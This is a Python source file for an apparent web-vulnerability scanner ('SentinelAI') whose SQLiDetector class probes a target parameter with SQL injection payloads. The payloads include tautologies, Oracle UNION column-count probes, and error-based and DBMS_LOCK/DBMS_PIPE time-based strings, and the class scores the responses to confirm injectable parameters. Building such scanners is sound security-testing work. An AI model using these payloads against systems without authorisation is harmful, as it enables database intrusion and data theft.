# app/modules/scanner/sqli_detector.py
"""
Intelligent SQL Injection Detection Engine for SentinelAI.
Phase 7: SQL Injection Detection
"""

import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any

import requests

from .html_parser import HTMLParser
from .regex_utils import RegexUtils
from .union_sqli import UnionSQLi

# ============================================================
# Data Classes
# ============================================================


@dataclass
class SQLiDetectionResult:
    """
    SQL Injection detection result.
    Contains comprehensive detection information.
    """

    success: bool = False
    parameter: str | None = None
    injection_type: str | None = None
    payload: str | None = None
    confidence: int = 0
    risk_level: str = "LOW"
    evidence: list[str] = field(default_factory=list)
    response_diff: dict[str, Any] | None = None
    column_count: int = 0
    dbms_confidence: dict[str, int] = field(default_factory=dict)
    techniques_tested: list[str] = field(default_factory=list)
    execution_time: float = 0.0
    errors: list[str] = field(default_factory=list)

    # Raw data
    baseline_response: str | None = None
    payload_responses: dict[str, str] = field(default_factory=dict)

    def add_evidence(self, evidence: str):
        """Add evidence to the result."""
        if evidence and evidence not in self.evidence:
            self.evidence.append(evidence)

    def add_error(self, error: str):
        """Add an error to the result."""
        self.errors.append(error)

    def add_dbms_confidence(self, dbms: str, score: int):
        """Add DBMS confidence score."""
        self.dbms_confidence[dbms] = score

    def get_summary(self) -> str:
        """Get a summary of the detection result."""
        if not self.success:
            return "SQL Injection not detected"

        parts = []
        if self.parameter:
            parts.append(f"Parameter: {self.parameter}")
        if self.injection_type:
            parts.append(f"Type: {self.injection_type}")
        if self.confidence > 0:
            parts.append(f"Confidence: {self.confidence}%")
        if self.risk_level:
            parts.append(f"Risk: {self.risk_level}")
        if self.payload:
            parts.append(f"Payload: {self.payload[:50]}...")
        if self.column_count > 0:
            parts.append(f"Columns: {self.column_count}")
        if self.evidence:
            parts.append(f"Evidence: {len(self.evidence)} items")

        return f"SQLi: {', '.join(parts)}" if parts else "SQLi detected"

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for logging/output."""
        return {
            "success": self.success,
            "parameter": self.parameter,
            "injection_type": self.injection_type,
            "payload": self.payload,
            "confidence": self.confidence,
            "risk_level": self.risk_level,
            "evidence": self.evidence,
            "column_count": self.column_count,
            "dbms_confidence": self.dbms_confidence,
            "techniques_tested": self.techniques_tested,
            "execution_time": self.execution_time,
            "errors": self.errors,
            "summary": self.get_summary(),
        }


# ============================================================
# Main SQL Injection Detector Class
# ============================================================


class SQLiDetector:
    """
    Intelligent SQL Injection Detection Engine.
    Phase 7: Detects SQL injection vulnerabilities.
    """

    # ============================================================
    # Constants
    # ============================================================

    # Confidence thresholds
    CONFIDENCE_LOW = 30
    CONFIDENCE_MEDIUM = 60
    CONFIDENCE_HIGH = 80
    CONFIDENCE_VERY_HIGH = 95

    # Risk levels
    RISK_LOW = "LOW"
    RISK_MEDIUM = "MEDIUM"
    RISK_HIGH = "HIGH"
    RISK_CRITICAL = "CRITICAL"

    # Payload categories
    PAYLOADS = {
        "normal": [
            ("'", "Single quote"),
            ('"', "Double quote"),
            ("' OR '1'='1", "OR True with single quotes"),
            ("' OR 1=1--", "OR True with comment"),
            ("' AND '1'='1", "AND True with single quotes"),
            ("' AND '1'='2", "AND False with single quotes"),
            ("' OR 1=1#", "OR True with hash"),
            ("1' AND '1'='1", "Integer with AND True"),
            ("1' AND '1'='2", "Integer with AND False"),
        ],
        "oracle": [
            ("' UNION SELECT NULL FROM dual--", "UNION NULL from dual"),
            ("' UNION SELECT NULL,NULL FROM dual--", "UNION 2 NULLs from dual"),
            ("' AND 1=1--", "AND True"),
            ("' AND 1=2--", "AND False"),
            ("' OR 1=1--", "OR True"),
            ("' AND ROWNUM=1--", "ROWNUM True"),
            ("' AND 1=TO_NUMBER('1')--", "TO_NUMBER True"),
            ("' AND 1=TO_NUMBER('2')--", "TO_NUMBER False"),
        ],
        "error_based": [
            ("' AND 1=TO_NUMBER('test')--", "TO_NUMBER error"),
            ("' AND 1=CTXSYS.DRITHSX.SN('test')--", "CTXSYS error"),
            ("' AND 1=UTL_INADDR.GET_HOST_ADDRESS('test')--", "UTL_INADDR error"),
            ("' AND 1=DBMS_XDB_VERSION.CHECKVERSION('test')--", "DBMS_XDB error"),
        ],
        "time_based": [
            ("' AND 1=DBMS_LOCK.SLEEP(5)--", "DBMS_LOCK sleep 5s"),
            ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--", "DBMS_PIPE sleep 5s"),
        ],
        "union": [
            ("' UNION SELECT NULL FROM dual--", "UNION NULL"),
            ("' UNION SELECT NULL,NULL FROM dual--", "UNION 2 NULLs"),
            ("' UNION SELECT NULL,NULL,NULL FROM dual--", "UNION 3 NULLs"),
            ("' UNION SELECT NULL,NULL,NULL,NULL FROM dual--", "UNION 4 NULLs"),
        ],
        "verification": [
            ("' AND 1=1--", "True condition"),
            ("' AND 1=2--", "False condition"),
            ("' OR 1=1--", "OR True"),
            ("' OR 1=2--", "OR False"),
        ],
    }

    # Oracle error patterns
    ORACLE_ERROR_PATTERNS = [
        r"ORA-\d{5}",
        r"ORA-00933",
        r"ORA-00904",
        r"ORA-01756",
        r"ORA-01858",
        r"ORA-01861",
    ]

    # DBMS fingerprints
    DBMS_FINGERPRINTS = {
        "oracle": [
            r"Oracle Database",
            r"ORA-\d{5}",
            r"dual",
            r"v\$version",
            r"rownum",
            r"sysdate",
        ],
        "mysql": [
            r"MySQL",
            r"You have an error in your SQL syntax",
            r"Table \'.*\' doesn\'t exist",
            r"Unknown column",
        ],
        "postgresql": [
            r"PostgreSQL",
            r"ERROR:  syntax error",
            r'relation ".*" does not exist',
            r'column ".*" does not exist',
        ],
        "mssql": [
            r"Microsoft SQL",
            r"SQL Server",
            r"Conversion failed when converting",
            r"Invalid column name",
            r"Msg \d+, Level",
        ],
    }

    # ============================================================
    # Initialization
    # ============================================================

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        logger: logging.Logger | None = None,
    ):
        """
        Initialize SQL Injection detector.

        Args:
            session: Requests session for HTTP requests
            base_url: Target base URL
            logger: Optional logger instance
        """
        self.session = session
        self.base_url = base_url
        self.logger = logger or self._setup_logger()

        # Initialize components
        self.union_sqli = UnionSQLi(session, base_url, logger)
        self.html_parser = HTMLParser()
        self.regex_utils = RegexUtils()

        # State
        self.baseline_response = None
        self.baseline_size = 0
        self.baseline_time = 0
        self.detection_result = None

        self.logger.info(
            "[SQLiDetector] Module initialized for SQL injection detection"
        )
        self.logger.info(f"[SQLiDetector] Target: {base_url}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("SQLiDetector")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    # ============================================================
    # Private Methods
    # ============================================================

    def _get_baseline(
        self, injection_point: str
    ) -> tuple[requests.Response | None, int, float]:
        """Get baseline response with timing."""
        start_time = time.time()

        if self.baseline_response is None:
            self.logger.info("[SQLiDetector] Fetching baseline response...")
            self.baseline_response = self.union_sqli.get_baseline(injection_point)

            if self.baseline_response:
                self.baseline_size = len(self.baseline_response.text)
                self.logger.info(
                    f"[SQLiDetector] Baseline size: {self.baseline_size} bytes"
                )
            else:
                self.logger.warning("[SQLiDetector] Failed to get baseline response")

        elapsed = time.time() - start_time
        return self.baseline_response, self.baseline_size, elapsed

    def _send_payload_with_metrics(
        self, injection_point: str, payload: str, baseline: requests.Response | None
    ) -> dict[str, Any]:
        """Send payload and collect metrics."""
        start_time = time.time()

        result = self.union_sqli.test_payload(injection_point, payload, baseline)

        elapsed = time.time() - start_time

        if not result["success"] or result.get("response") is None:
            return {
                "success": False,
                "response": None,
                "size": 0,
                "time": elapsed,
                "has_changed": False,
                "error": "Request failed",
            }

        response = result["response"]
        response_text = response.text

        return {
            "success": True,
            "response": response,
            "response_text": response_text,
            "size": len(response_text),
            "time": elapsed,
            "has_changed": result.get("has_changed", False),
            "status_code": response.status_code,
        }

    def _check_oracle_errors(self, text: str) -> list[str]:
        """Check for Oracle errors in text."""
        errors = []
        for pattern in self.ORACLE_ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                errors.append(pattern)
        return errors

    def _check_dbms_fingerprints(self, text: str) -> dict[str, int]:
        """Check for DBMS fingerprints in text."""
        scores = {}
        for dbms, patterns in self.DBMS_FINGERPRINTS.items():
            score = 0
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    score += 20
            if score > 0:
                scores[dbms] = min(score, 100)
        return scores

    def _calculate_confidence(
        self,
        has_changed: bool,
        size_diff: int,
        error_found: bool,
        pattern_matches: int,
        time_diff: float = 0,
    ) -> int:
        """Calculate confidence score."""
        confidence = 0

        # Response change
        if has_changed:
            confidence += 30

        # Size difference
        if size_diff > 0:
            if size_diff > 1000:
                confidence += 30
            elif size_diff > 100:
                confidence += 20
            else:
                confidence += 10

        # Error found
        if error_found:
            confidence += 25

        # Pattern matches
        if pattern_matches > 0:
            confidence += min(pattern_matches * 10, 30)

        # Time difference (for time-based)
        if time_diff > 1.0:
            confidence += min(int(time_diff * 5), 20)

        return min(confidence, 100)

    def _get_risk_level(self, confidence: int) -> str:
        """Get risk level based on confidence."""
        if confidence >= 95:
            return self.RISK_CRITICAL
        elif confidence >= 80:
            return self.RISK_HIGH
        elif confidence >= 60:
            return self.RISK_MEDIUM
        else:
            return self.RISK_LOW

    def _try_payloads(
        self,
        injection_point: str,
        payloads: list[tuple[str, str]],
        target_type: str,
        threshold: int = 50,
    ) -> dict[str, Any]:
        """Try a list of payloads and return the best one."""
        baseline, baseline_size, baseline_time = self._get_baseline(injection_point)

        best_result = None
        best_score = 0
        best_payload = None
        best_type = None

        for payload, description in payloads:
            self.logger.info(f"[SQLiDetector] Testing {target_type}: {description}")
            self.logger.debug(f"[SQLiDetector] Payload: {payload}")

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if not result["success"]:
                self.logger.warning(f"[SQLiDetector] Payload failed: {description}")
                continue

            # Calculate metrics
            size_diff = result["size"] - baseline_size
            errors = self._check_oracle_errors(result["response_text"])
            fingerprints = self._check_dbms_fingerprints(result["response_text"])

            confidence = self._calculate_confidence(
                result["has_changed"],
                size_diff,
                len(errors) > 0,
                sum(fingerprints.values()) // 20 if fingerprints else 0,
                result["time"] - baseline_time,
            )

            self.logger.info(
                f"[SQLiDetector] Confidence: {confidence}%, Size diff: {size_diff}"
            )

            if confidence > best_score:
                best_score = confidence
                best_payload = payload
                best_type = target_type
                best_result = {
                    "payload": payload,
                    "description": description,
                    "confidence": confidence,
                    "size_diff": size_diff,
                    "errors": errors,
                    "fingerprints": fingerprints,
                    "response": result["response_text"],
                }

        return {
            "success": best_score >= threshold,
            "best_score": best_score,
            "best_payload": best_payload,
            "best_type": best_type,
            "best_result": best_result,
            "threshold": threshold,
        }

    # ============================================================
    # Public Detection Methods
    # ============================================================

    def detect_union(self, injection_point: str) -> dict[str, Any]:
        """
        Detect UNION-based SQL injection.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Dict: Union detection results
        """
        self.logger.info("[SQLiDetector] Detecting UNION injection...")
        start_time = time.time()

        baseline, baseline_size, _ = self._get_baseline(injection_point)

        # Try different NULL counts
        best_result = None
        best_count = 0
        best_confidence = 0

        for count in range(1, 11):  # Try up to 10 columns
            nulls = ",".join(["NULL"] * count)
            payload = f"' UNION SELECT {nulls} FROM dual--"

            self.logger.debug(f"[SQLiDetector] Testing UNION with {count} columns")

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if result["success"]:
                size_diff = result["size"] - baseline_size
                errors = self._check_oracle_errors(result["response_text"])
                fingerprints = self._check_dbms_fingerprints(result["response_text"])

                confidence = self._calculate_confidence(
                    result["has_changed"],
                    size_diff,
                    len(errors) > 0,
                    sum(fingerprints.values()) // 20 if fingerprints else 0,
                )

                if confidence > best_confidence:
                    best_confidence = confidence
                    best_count = count
                    best_result = {
                        "count": count,
                        "confidence": confidence,
                        "payload": payload,
                        "size_diff": size_diff,
                        "fingerprints": fingerprints,
                    }

        elapsed = time.time() - start_time

        return {
            "success": best_confidence >= 50,
            "column_count": best_count,
            "confidence": best_confidence,
            "best_result": best_result,
            "execution_time": elapsed,
        }

    def detect_boolean(self, injection_point: str) -> dict[str, Any]:
        """
        Detect Boolean-based SQL injection.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Dict: Boolean detection results
        """
        self.logger.info("[SQLiDetector] Detecting Boolean injection...")
        start_time = time.time()

        baseline, _baseline_size, _ = self._get_baseline(injection_point)

        # Test true/false conditions
        true_payloads = [
            ("' AND 1=1--", "AND True"),
            ("' OR 1=1--", "OR True"),
            ("' AND '1'='1", "AND True with quotes"),
        ]

        false_payloads = [
            ("' AND 1=2--", "AND False"),
            ("' OR 1=2--", "OR False"),
            ("' AND '1'='2", "AND False with quotes"),
        ]

        true_results = []
        false_results = []

        for payload, desc in true_payloads:
            result = self._send_payload_with_metrics(injection_point, payload, baseline)
            if result["success"]:
                true_results.append(
                    {
                        "payload": payload,
                        "size": result["size"],
                        "has_changed": result["has_changed"],
                    }
                )

        for payload, desc in false_payloads:
            result = self._send_payload_with_metrics(injection_point, payload, baseline)
            if result["success"]:
                false_results.append(
                    {
                        "payload": payload,
                        "size": result["size"],
                        "has_changed": result["has_changed"],
                    }
                )

        # Analyze results
        is_boolean = False
        confidence = 0
        best_payload = None

        if true_results and false_results:
            # Check if true and false produce different results
            true_sizes = [r["size"] for r in true_results]
            false_sizes = [r["size"] for r in false_results]

            if true_sizes and false_sizes:
                avg_true = sum(true_sizes) / len(true_sizes)
                avg_false = sum(false_sizes) / len(false_sizes)

                size_diff = abs(avg_true - avg_false)

                if size_diff > 0:
                    is_boolean = True
                    confidence = min(50 + (size_diff / 10), 95)
                    best_payload = true_payloads[0][0] if true_sizes else None

        elapsed = time.time() - start_time

        return {
            "success": is_boolean,
            "confidence": confidence,
            "true_results": true_results,
            "false_results": false_results,
            "best_payload": best_payload,
            "execution_time": elapsed,
        }

    def detect_error_based(self, injection_point: str) -> dict[str, Any]:
        """
        Detect Error-based SQL injection.

        Args:
            injection_point: Parameter to inject into

        Returns:
            Dict: Error detection results
        """
        self.logger.info("[SQLiDetector] Detecting Error-based injection...")
        start_time = time.time()

        baseline, _, _ = self._get_baseline(injection_point)

        best_result = None
        best_confidence = 0

        for payload, description in self.PAYLOADS["error_based"]:
            self.logger.debug(f"[SQLiDetector] Testing: {description}")

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if result["success"]:
                errors = self._check_oracle_errors(result["response_text"])

                if errors:
                    confidence = 70 + (len(errors) * 10)
                    if confidence > best_confidence:
                        best_confidence = min(confidence, 100)
                        best_result = {
                            "payload": payload,
                            "description": description,
                            "errors": errors,
                            "confidence": best_confidence,
                            "response_size": result["size"],
                        }

        elapsed = time.time() - start_time

        return {
            "success": best_confidence >= 50,
            "confidence": best_confidence,
            "best_result": best_result,
            "execution_time": elapsed,
        }

    def detect_time_based(
        self, injection_point: str, sleep_seconds: int = 5
    ) -> dict[str, Any]:
        """
        Detect Time-based SQL injection.

        Args:
            injection_point: Parameter to inject into
            sleep_seconds: Sleep duration to test

        Returns:
            Dict: Time-based detection results
        """
        self.logger.info("[SQLiDetector] Detecting Time-based injection...")
        start_time = time.time()

        baseline, _, baseline_time = self._get_baseline(injection_point)

        best_result = None
        best_confidence = 0

        for payload, description in self.PAYLOADS["time_based"]:
            # Replace sleep value if needed
            payload = payload.replace("5", str(sleep_seconds))

            self.logger.debug(f"[SQLiDetector] Testing: {description}")

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if result["success"]:
                elapsed = result["time"]
                time_diff = elapsed - baseline_time

                if time_diff >= sleep_seconds * 0.8:  # 80% of expected sleep
                    confidence = 90
                    best_confidence = confidence
                    best_result = {
                        "payload": payload,
                        "description": description,
                        "time_elapsed": elapsed,
                        "time_diff": time_diff,
                        "confidence": confidence,
                    }
                    break
                elif time_diff >= sleep_seconds * 0.5:
                    confidence = 70
                    if confidence > best_confidence:
                        best_confidence = confidence
                        best_result = {
                            "payload": payload,
                            "description": description,
                            "time_elapsed": elapsed,
                            "time_diff": time_diff,
                            "confidence": confidence,
                        }

        elapsed = time.time() - start_time

        return {
            "success": best_confidence >= 50,
            "confidence": best_confidence,
            "best_result": best_result,
            "execution_time": elapsed,
        }

    def detect_column_count(self, injection_point: str, max_columns: int = 30) -> int:
        """
        Detect UNION column count.

        Args:
            injection_point: Parameter to inject into
            max_columns: Maximum columns to test

        Returns:
            int: Number of columns found
        """
        self.logger.info(
            f"[SQLiDetector] Detecting column count (max: {max_columns})..."
        )

        baseline, baseline_size, _ = self._get_baseline(injection_point)

        for count in range(1, max_columns + 1):
            nulls = ",".join(["NULL"] * count)
            payload = f"' UNION SELECT {nulls} FROM dual--"

            result = self._send_payload_with_metrics(injection_point, payload, baseline)

            if result["success"] and result["has_changed"]:
                size_diff = result["size"] - baseline_size
                if size_diff > 10:  # Significant change
                    self.logger.info(f"[SQLiDetector] Found column count: {count}")
                    return count

        self.logger.warning("[SQLiDetector] Failed to detect column count")
        return 0

    def verify(self, injection_point: str, payload: str) -> dict[str, Any]:
        """
        Verify a suspected injection.

        Args:
            injection_point: Parameter to inject into
            payload: Payload to verify

        Returns:
            Dict: Verification results
        """
        self.logger.info(f"[SQLiDetector] Verifying injection: {payload[:50]}...")

        baseline, baseline_size, _ = self._get_baseline(injection_point)

        result = self._send_payload_with_metrics(injection_point, payload, baseline)

        if not result["success"]:
            return {"success": False, "verified": False, "reason": "Request failed"}

        # Check multiple indicators
        indicators = {
            "size_changed": result["size"] != baseline_size,
            "error_found": len(self._check_oracle_errors(result["response_text"])) > 0,
            "has_evidence": len(result["response_text"]) > 0,
            "status_changed": result["status_code"] != 200,
        }

        verified = any(indicators.values()) and indicators["has_evidence"]
        confidence = 0

        if indicators["error_found"]:
            confidence += 40
        if indicators["size_changed"]:
            confidence += 30
        if indicators["status_changed"]:
            confidence += 20

        return {
            "success": True,
            "verified": verified,
            "confidence": min(confidence, 100),
            "indicators": indicators,
            "response_size": result["size"],
        }

    # ============================================================
    # Main Detection Method
    # ============================================================

    def detect(
        self, injection_point: str, fast_mode: bool = False
    ) -> SQLiDetectionResult:
        """
        Perform comprehensive SQL injection detection.

        Args:
            injection_point: Parameter to inject into
            fast_mode: Skip time-based detection for speed

        Returns:
            SQLiDetectionResult: Detection result
        """
        self.logger.info(
            "[SQLiDetector] =================================================="
        )
        self.logger.info("[SQLiDetector] PHASE 7: SQL Injection Detection")
        self.logger.info(
            "[SQLiDetector] =================================================="
        )

        result = SQLiDetectionResult(parameter=injection_point)
        total_start = time.time()

        try:
            # Step 1: Get baseline
            self.logger.info("[SQLiDetector] Step 1: Establishing baseline...")
            baseline, _baseline_size, _baseline_time = self._get_baseline(
                injection_point
            )
            result.baseline_response = baseline.text if baseline else None
            result.techniques_tested.append("baseline")

            # Step 2: Test normal payloads
            self.logger.info("[SQLiDetector] Step 2: Testing normal payloads...")
            normal_result = self._try_payloads(
                injection_point, self.PAYLOADS["normal"], "normal", threshold=40
            )

            if normal_result["success"]:
                result.add_evidence("Normal payloads showed differences")
                result.confidence = max(result.confidence, normal_result["best_score"])
                result.payload = normal_result["best_payload"]

            # Step 3: Test Oracle-specific payloads
            self.logger.info(
                "[SQLiDetector] Step 3: Testing Oracle-specific payloads..."
            )
            oracle_result = self._try_payloads(
                injection_point, self.PAYLOADS["oracle"], "oracle", threshold=50
            )

            if oracle_result["success"]:
                result.add_evidence("Oracle-specific payloads successful")
                result.confidence = max(result.confidence, oracle_result["best_score"])
                result.add_dbms_confidence(
                    "oracle", min(oracle_result["best_score"] + 20, 100)
                )
                result.injection_type = "UNION/BOOLEAN"
                result.techniques_tested.append("oracle_specific")

            # Step 4: Test UNION
            self.logger.info("[SQLiDetector] Step 4: Testing UNION injection...")
            union_result = self.detect_union(injection_point)

            if union_result["success"]:
                result.add_evidence(
                    f"UNION injection detected with {union_result['column_count']} columns"
                )
                result.column_count = union_result["column_count"]
                result.confidence = max(result.confidence, union_result["confidence"])
                result.injection_type = "UNION"
                result.techniques_tested.append("union")
                result.payload = (
                    union_result["best_result"]["payload"]
                    if union_result["best_result"]
                    else None
                )

            # Step 5: Test Error-based
            self.logger.info("[SQLiDetector] Step 5: Testing Error-based injection...")
            error_result = self.detect_error_based(injection_point)

            if error_result["success"]:
                result.add_evidence("Error-based injection detected")
                result.confidence = max(result.confidence, error_result["confidence"])
                if result.injection_type != "UNION":
                    result.injection_type = "ERROR_BASED"
                result.techniques_tested.append("error_based")
                result.payload = (
                    error_result["best_result"]["payload"]
                    if error_result["best_result"]
                    else None
                )

            # Step 6: Test Boolean
            self.logger.info("[SQLiDetector] Step 6: Testing Boolean injection...")
            boolean_result = self.detect_boolean(injection_point)

            if boolean_result["success"]:
                result.add_evidence("Boolean injection detected")
                result.confidence = max(result.confidence, boolean_result["confidence"])
                if result.injection_type not in ["UNION", "ERROR_BASED"]:
                    result.injection_type = "BOOLEAN"
                result.techniques_tested.append("boolean")
                result.payload = boolean_result["best_payload"]

            # Step 7: Test Time-based (skip in fast mode)
            if not fast_mode:
                self.logger.info(
                    "[SQLiDetector] Step 7: Testing Time-based injection..."
                )
                time_result = self.detect_time_based(injection_point)

                if time_result["success"]:
                    result.add_evidence("Time-based injection detected")
                    result.confidence = max(
                        result.confidence, time_result["confidence"]
                    )
                    if result.injection_type not in ["UNION", "ERROR_BASED", "BOOLEAN"]:
                        result.injection_type = "TIME_BASED"
                    result.techniques_tested.append("time_based")
                    result.payload = (
                        time_result["best_result"]["payload"]
                        if time_result["best_result"]
                        else None
                    )

            # Step 8: Verify if confident
            if result.confidence >= 60 and result.payload:
                self.logger.info("[SQLiDetector] Step 8: Verifying injection...")
                verify_result = self.verify(injection_point, result.payload)

                if verify_result["verified"]:
                    result.add_evidence(
                        f"Verified with {verify_result['confidence']}% confidence"
                    )
                    result.confidence = max(
                        result.confidence, verify_result["confidence"]
                    )
                    result.techniques_tested.append("verified")
                else:
                    result.add_evidence(
                        f"Verification failed: {verify_result.get('reason', 'Unknown')}"
                    )

            # Determine success
            result.success = result.confidence >= 50
            result.risk_level = self._get_risk_level(result.confidence)

            # Add DBMS fingerprint
            if baseline:
                fingerprints = self._check_dbms_fingerprints(baseline.text)
                for dbms, score in fingerprints.items():
                    result.add_dbms_confidence(dbms, score)

        except Exception as e:
            error_msg = f"SQL Injection detection failed: {e!s}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        result.execution_time = time.time() - total_start

        self.logger.info(
            "[SQLiDetector] =================================================="
        )
        self.logger.info("[SQLiDetector] SQL INJECTION DETECTION COMPLETE")
        self.logger.info(f"[SQLiDetector] {result.get_summary()}")
        self.logger.info(f"[SQLiDetector] Confidence: {result.confidence}%")
        self.logger.info(f"[SQLiDetector] Risk: {result.risk_level}")
        self.logger.info(f"[SQLiDetector] Time: {result.execution_time:.2f}s")
        self.logger.info(
            "[SQLiDetector] =================================================="
        )

        self.detection_result = result
        return result

    # ============================================================
    # Convenience Methods
    # ============================================================

    def is_vulnerable(self, injection_point: str) -> bool:
        """Quick check if parameter is vulnerable."""
        result = self.detect(injection_point, fast_mode=True)
        return result.success

    def get_confidence(self, injection_point: str) -> int:
        """Get confidence score for a parameter."""
        result = self.detect(injection_point, fast_mode=True)
        return result.confidence

    def get_payload(self, injection_point: str) -> str | None:
        """Get working payload for a parameter."""
        result = self.detect(injection_point, fast_mode=True)
        return result.payload
